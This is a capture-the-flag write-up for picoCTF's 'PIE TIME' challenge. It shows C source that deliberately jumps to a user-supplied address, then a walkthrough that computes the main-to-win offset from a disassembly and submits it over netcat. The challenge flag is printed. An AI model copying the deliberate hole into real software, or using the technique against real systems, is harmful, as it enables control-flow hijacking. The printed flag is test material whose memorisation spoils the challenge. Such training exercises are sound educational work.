# PIE TIME

> Category: Binary Exploitation

## Description

Can you try to get the flag? Beware we have PIE!

Connect to the program with netcat:

`$ nc rescued-float.picoctf.net 59154`

The binary can be downloaded [here](https://challenge-files.picoctf.net/c_rescued_float/fe4ce0914c5cf0111ebaf652993fb92a44ea9a7d1529b1bcd8d58827c17ca43b/vuln)

<details>
<summary>Program source code</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
</details>

## Solution

The goal of this challenge is to somehow make the program call the `win()` function. Let's break down what the provided source code is doing

* `win()`: prints the flag

* `main()`: Gives us the memory address of `main`, allows us to input a memory address in hexadecimal which then gets treated as a function pointer and then executed

> One thing to note is that the challenge description (and name) mentions PIE, and after doing some googling, [this website](https://ir0nstone.gitbook.io/notes/binexp/stack/pie) tells us that "PIE stands for **Position Independent Executable**, which means that every time you run the file it gets loaded into a different memory address."
>
> That same website also tells us that "PIE executables are based around **relative** rather than **absolute** addresses, meaning that while the locations in memory are fairly random the offsets between different **parts of the binary** remain **constant**"

This means that all we need to know is how many bytes the `win()` function is away from `main()` since the program already tells us the address of `main()`.

Let's disassemble the `vuln` binary file to see the addresses of both `main` and `win`

```sh
$ llvm-objdump-19 -d vuln | grep -e main -e win
    11c1: 48 8d 3d 75 01 00 00          leaq    0x175(%rip), %rdi       # 0x133d <main>
00000000000012a7 <win>:
    12db: 75 16                         jne     0x12f3 <win+0x4c>
    1302: eb 1a                         jmp     0x131e <win+0x77>
    1322: 75 e0                         jne     0x1304 <win+0x5d>
000000000000133d <main>:
    1387: 48 8d 35 af ff ff ff          leaq    -0x51(%rip), %rsi       # 0x133d <main>
    1400: 74 05                         je      0x1407 <main+0xca>
```

As we can see, the `main` function is at address `0x133d` and `win` is at address `0x12a7`.

The following Python REPL snippet tells us what the offset between these two addresses are

```py
>>> hex(0x133d - 0x12a7)
'0x96'
```

Now all we have to do is rerun the `nc` command, subtract `0x96` from main's memory address, and use that as our input

```sh
$ nc rescued-float.picoctf.net 64321
Address of main: 0x5784d364833d
Enter the address to jump to, ex => 0x12345:
```

Going to use a little bit of Python again to subtract `0x96` from main's address `0x5784d364833d`

```py
>>> hex(0x5784d364833d - 0x96)
'0x5784d36482a7'
```

The address we want to jump to is `0x5784d36482a7`

```sh
Enter the address to jump to, ex => 0x12345: 0x5784d36482a7
Your input: 5784d36482a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_f8845f06}
```

### Flag

`picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_f8845f06}`

